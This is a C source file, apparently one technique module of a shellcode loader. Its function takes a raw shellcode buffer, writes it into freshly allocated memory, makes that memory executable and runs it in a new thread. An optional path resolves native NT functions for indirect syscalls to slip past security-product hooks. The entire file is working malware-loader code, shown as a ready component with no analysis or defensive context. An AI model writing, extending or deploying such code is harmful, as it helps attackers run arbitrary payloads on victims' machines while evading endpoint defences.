#include "../config.h"
#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_createthread(unsigned char *sc, size_t len) {
#if USE_INDIRECT_SYSCALLS
    fnNtAllocateVirtualMemory pAlloc =
        (fnNtAllocateVirtualMemory)ntapi_resolve("NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory pProtect =
        (fnNtProtectVirtualMemory)ntapi_resolve("NtProtectVirtualMemory");
    fnNtCreateThreadEx pThread =
        (fnNtCreateThreadEx)ntapi_resolve("NtCreateThreadEx");
    fnNtWaitForSingleObject pWait =
        (fnNtWaitForSingleObject)ntapi_resolve("NtWaitForSingleObject");
    if (!pAlloc || !pProtect || !pThread || !pWait) return FALSE;

    PVOID mem = NULL;
    SIZE_T sz = len;
    if (!NT_SUCCESS(pAlloc((HANDLE)-1, &mem, 0, &sz,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;

    memcpy(mem, sc, len);

    ULONG old = 0;
    pProtect((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = NULL;
    if (!NT_SUCCESS(pThread(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                            mem, NULL, 0, 0, 0, 0, NULL)))
        return FALSE;

    pWait(hThread, FALSE, NULL);
    CloseHandle(hThread);
#else
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) return FALSE;
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
#endif
    return TRUE;
}
